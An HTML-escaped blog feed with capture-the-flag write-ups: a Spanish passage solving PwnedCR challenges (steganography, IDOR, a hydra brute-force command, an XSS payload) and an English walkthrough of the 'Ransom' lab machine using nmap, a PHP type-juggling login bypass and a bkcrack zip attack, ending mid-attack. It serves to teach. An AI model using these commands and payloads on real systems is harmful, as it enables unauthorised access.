&lt;p&gt;Vemos que nos dan una pista la cual es: ‚Äúla imagen contiene alg√∫n mensaje‚Äù y con esto ya nos viene a la mente que puede ser un mensaje fue escondido con esteganograf√≠a.&lt;/p&gt;

&lt;p&gt;Para analizar la image a un nivel mas bajo podemos utilizar la herramienta: &lt;em&gt;exiftool&lt;/em&gt; la cual es una herramienta para ver los metadatos en archivos.&lt;/p&gt;

&lt;p&gt;Podemos descargar la imagen y ejecutar el siguiente comando para analizarla.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;exiftool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tron&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;png&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y en efecto vemos bastante informacion y entre ella la flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/6.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;enum√©rame&quot;&gt;Enum√©rame:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/7.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos dan esta pista ‚Äúreto4.php?id=123‚Äù ya podemos pensar en un ataque IDOR (Insecure direct object references) lo que podemos hacer es ir iterando entre numeros, 124, 125, 126‚Ä¶etc.&lt;/p&gt;

&lt;p&gt;Poniendo 126 en lugar de 123: ‚Äú&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://ctf.pwnedcr.com/retos/reto4.php?id=126&lt;/code&gt;‚Äù ya podemos ver la flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/8.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;bruto-el-fuerte&quot;&gt;Bruto el fuerte&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/9.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos descargar los dos diccionarios que nos proveen ya que los vamos a utilizar.&lt;/p&gt;

&lt;p&gt;Presionando ‚ÄúAbrir app‚Äù y nos abre la siguiente ventana:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/10.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos dan una pista con el titulo ya que se refiere a un ‚Äúataque de fuerza bruta‚Äù.&lt;/p&gt;

&lt;p&gt;Con la herramienta &lt;em&gt;hydra&lt;/em&gt; podemos hacer el ataque‚Ä¶&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hydra&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usernames&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shortlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rockyou_top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pwnedcr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;com&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/retos/reto5_login.php:username=^USER^&amp;amp;password=^PASS^:F=ACCESS DENIED&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Uso de &lt;em&gt;hydra&lt;/em&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;-L ‚Äì&amp;gt; Indicamos que le vamos a pasar un diccionario de &lt;strong&gt;usuarios&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;-P ‚Äì&amp;gt; Indicamos que le vamos a pasar un diccionario de &lt;strong&gt;contrase√±as&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;ctf.pwnedcr.com ‚Äì&amp;gt; Es el dominio que vamos a atacar.&lt;/li&gt;
  &lt;li&gt;https-post-form ‚Äì&amp;gt; Vamos a enviar un formulario que serian el usuario y contrase√±a.&lt;/li&gt;
  &lt;li&gt;/retos/reto5_login.php ‚Äì&amp;gt; La ruta donde se ubica el formulario que vamos a atacar.&lt;/li&gt;
  &lt;li&gt;:username=^USER^&amp;amp;password=^PASS^ ‚Äì&amp;gt; Estos son los campos que vamos a atacar con hydra el username y password, para saber si son diferentes nos podemos fijar en la peticion que estamos enviando por burp o tambien lo podemos ver en el codigo fuente.&lt;/li&gt;
  &lt;li&gt;:F=ACCESS DENIED ‚Äì&amp;gt; El ‚ÄúACCESS DENIED‚Äù es la palabra que la pagina web nos va a dar si hacemos un intento fallido, el ‚ÄúACCESS DENIED‚Äù lo saque del codigo fuente de la pagina cuando ponemos unas credenciales no validas, lo vemos en la siguiente imagen:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/18.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para mas informacion recomiendo buscar en google ;)&lt;/p&gt;

&lt;p&gt;Ejecutamos comando anterior en nuestra terminal y obtenemos un username y un password: admin:jordan23&lt;/p&gt;

&lt;p&gt;Y obtenemos la flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/17.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;siete-a-cero&quot;&gt;Siete a cero:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/11.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Presionando ‚ÄúAbrir app‚Äù y nos abre la siguiente ventana:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/10.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ponemos ‚Äútest‚Äù y ‚Äútest‚Äù y vemos que el output se ve reflejado y pensamos en un ataque xss. (Al principio intente hacer un bypass del login y dure muchas horas y no pude hacer nada y al hacer un xss fue algo irreal.)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/12.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para hacer el ataque xss ponemos: ‚Äú&lt;strong&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/strong&gt;‚Äù en la parte del usuario y en la parte del password ponemos lo que querramos.  (‚ÄúTiene que ser exactamente igual por que si variamos auque sea el numero, no nos dara la flag‚Äù)&lt;/p&gt;

&lt;p&gt;y con esto conseguimos la flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/13.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;scripteando&quot;&gt;Scripteando:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/14.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No hay muchas pistas pero empezamos con un analizis del codigo fuente de la pagina y vemos algo interesante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/15.png&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viendo mas esa linea de codigo podemos notar que ahi esta la flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/16.png&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;</content><author><name>FmF</name></author><summary type="html"></summary></entry><entry><title type="html">Ransom</title><link href="http://localhost:4000/ransom.html" rel="alternate" type="text/html" title="Ransom" /><published>2022-11-24T00:00:00-06:00</published><updated>2022-11-24T00:00:00-06:00</updated><id>http://localhost:4000/ransom</id><content type="html" xml:base="http://localhost:4000/ransom.html">&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/ransom.jpg&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;phases&quot;&gt;Phases:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Recognition.&lt;/li&gt;
  &lt;li&gt;Intrusion.&lt;/li&gt;
  &lt;li&gt;Privilege escalation.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;recognition&quot;&gt;Recognition:&lt;/h1&gt;

&lt;p&gt;We start the recognition by knowing the OS and if the vuln machine is online with the following command:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ping&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/1.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With that command, we send an ICMP package and if the &lt;em&gt;TTL&lt;/em&gt; is in a range of 64 is a Linux machine and if it is in a range of 128 is a Windows machine. In this case, we are against a &lt;em&gt;Linux&lt;/em&gt; machine.&lt;/p&gt;

&lt;p&gt;The next step that we are going to perform is a scan with &lt;strong&gt;Nmap&lt;/strong&gt; to search for open ports in the victim machine with the next command:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rate&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Pn&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;11.153&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allPorts&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;-p ‚Äì&amp;gt; This will search all the ports in the victim machine.&lt;/li&gt;
  &lt;li&gt;-sS ‚Äì&amp;gt; This will do a TCP-SYC scan that only makes half the connection of the three-way handshake with the target. (This will scan the target very fast).&lt;/li&gt;
  &lt;li&gt;‚Äìopen ‚Äì&amp;gt; It will only report the open ports.&lt;/li&gt;
  &lt;li&gt;‚Äìmin-rate 5000 ‚Äì&amp;gt; It will send 5000 packages per second.&lt;/li&gt;
  &lt;li&gt;-n ‚Äì&amp;gt; It won‚Äôt do a DNS scan.&lt;/li&gt;
  &lt;li&gt;-Pn ‚Äì&amp;gt; This won‚Äôt do an ARP host resolution scan.&lt;/li&gt;
  &lt;li&gt;-oG ‚Äì&amp;gt; This will save the scanned ports in a regex format to then use a script to get the ports more quickly and do a more intense scan.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We extract the ports of the file &lt;em&gt;allPorts&lt;/em&gt; with the following script. You must put it in your &lt;em&gt;.zshrc&lt;/em&gt; or  &lt;em&gt;.bashrc&lt;/em&gt; and install &lt;em&gt;xclip&lt;/em&gt;. (The owner of this script is &lt;em&gt;S4vitar&lt;/em&gt;.)&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$(cat $1 | grep -oP &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;{1,5}/open&apos; | awk &apos;{print $1}&apos; FS=&apos;/&apos; | xargs | tr &apos; &apos; &apos;,&apos;)&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$(cat $1 | grep -oP &apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;{1,3}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;{1,3}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;{1,3}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;{1,3}&apos; | sort -u | head -n 1)&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Extracting information...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tmp&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] IP Address: $ip_address&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tmp&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Open ports: $ports&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tmp&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nmap -sCV -p$ports -oN targeted &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\n&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xclip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sel&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clip&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Ports copied to clipboard&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tmp&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tmp&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We do a &lt;strong&gt;ctrl + v&lt;/strong&gt; to paste the following command and only need to put the IP address.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sCV&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;11.153&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oN&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Targeted&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;-sCV ‚Äì&amp;gt; This will show the version of the services running in the target‚Äôs open ports. Also, it will show us some vulnerabilities that we could exploit if it finds some.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/2.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This scan doesn‚Äôt give us much information. :(&lt;/p&gt;

&lt;p&gt;We see port 80 open, so we do the following to get more info:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;whatweb 10.10.11.153&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will show us the version of CMS and more information that could be useful for further steps. (Also, we could use the addon named Wappalizer in our web browser.) with this, we see the web redirecting to a &lt;em&gt;/login&lt;/em&gt; page; viewing the page is asking for a password we don‚Äôt have.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/3.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The web looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/7.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tried slqi, but no luck :(&lt;/p&gt;

&lt;p&gt;We tried &lt;em&gt;fuzzing&lt;/em&gt; the web but nothing interesting.&lt;/p&gt;

&lt;p&gt;We open &lt;strong&gt;burpsuite&lt;/strong&gt; to look at what is sending and if we can exploit some parameters.&lt;/p&gt;

&lt;p&gt;We see that the data we provide like the password, is being sent to a &lt;em&gt;/api/login&lt;/em&gt;. If we change the request method to &lt;em&gt;POST&lt;/em&gt; and send it, we get an error of &lt;strong&gt;&lt;em&gt;method not allowed&lt;/em&gt;&lt;/strong&gt;, and now we see that the &lt;em&gt;password field&lt;/em&gt; is now on the lower part of the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/4.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we change the method again to &lt;em&gt;GET&lt;/em&gt;, but with the password on the lower part of the request, we get a different error, but this is time indicating &lt;strong&gt;unprocessable content&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/5.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the response, we see that the content-type is using a &lt;em&gt;json format&lt;/em&gt; so we put it like this:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And also, we need to change the content-type to &lt;strong&gt;application/json&lt;/strong&gt; in our request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/6.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And this time we get an error indicating that the password is incorrect, but we are going in a rigth way :)&lt;/p&gt;

&lt;h2 id=&quot;intrusion&quot;&gt;Intrusion:&lt;/h2&gt;

&lt;p&gt;Searching for ways to exploit the page, we get this article: &lt;a href=&quot;https://www.invicti.com/blog/web-security/php-type-juggling-vulnerabilities/&quot; title=&quot;Type juggling attack&quot;&gt;Link&lt;/a&gt; it tells us that we can bypass the password input, providing a boolean.&lt;/p&gt;

&lt;p&gt;So we pass a bolean in our json format password input.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This way we get access to the page :)&lt;/p&gt;

&lt;p&gt;We see the user flag and a zip file.&lt;/p&gt;

&lt;p&gt;We download the zip file and use &lt;strong&gt;unzip&lt;/strong&gt; to try to decompress it but we need to provide a password and for now we don‚Äôt have it, so I used &lt;strong&gt;zip2john&lt;/strong&gt; and &lt;em&gt;fcrackzip&lt;/em&gt; to try to crack it but none of this work.&lt;/p&gt;

&lt;p&gt;We start to search for more information about the zip, we can use &lt;strong&gt;7z l uploaded-file-3422.zip&lt;/strong&gt; to see the content of the file, the file contents a id_rsa that we could use to connect to the victim machine, we use &lt;strong&gt;7z l uploaded-file-3422.zip -slt&lt;/strong&gt; to get even more information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/8.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will list more attributes of the zip files and we see that the method is &lt;strong&gt;ZipCrypto Deflate&lt;/strong&gt; searching for this method and how to crack a zip file we see an interesting post: &lt;a href=&quot;https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8&quot; title=&quot;How I Cracked CONTI Ransomware Group‚Äôs Leaked Source Code ZIP File&quot;&gt;Link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This attack can be used to crack the zip file, but we need a similar/same file that is in the encrypted zip and also that we have the content without encryption, looking at the previous image, we see a &lt;strong&gt;&lt;em&gt;.bash_logout&lt;/em&gt;&lt;/strong&gt; file and searching in our machine we find a file named like it, and maybe it could be the same, to make sure we can compare the size, we can do this with the command &lt;strong&gt;wc -c bash_logout&lt;/strong&gt; and we see that the size is the same as on the previous image that is &lt;strong&gt;220&lt;/strong&gt; same as the encrypted file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/9.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Link of the tool: &lt;a href=&quot;https://github.com/kimci86/bkcrack&quot; title=&quot;bkcrack tool&quot;&gt;Link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So we can do the following to perform the attack:&lt;/p&gt;

&lt;p&gt;First, we clone the tool with the command &lt;strong&gt;git clone https://github.com/kimci86/bkcrack&lt;/strong&gt; and install it, then we go where the executable is, and there we are going to copy the &lt;strong&gt;encrypted zip&lt;/strong&gt; and the &lt;strong&gt;.bash_logout&lt;/strong&gt; that we have in plain text, to then do the this:&lt;/p&gt;

&lt;p&gt;We create a zip with the &lt;strong&gt;.bash_logout&lt;/strong&gt; that we have in plain text:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;zip plain.zip .bash_logout&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Then we do this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/10.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

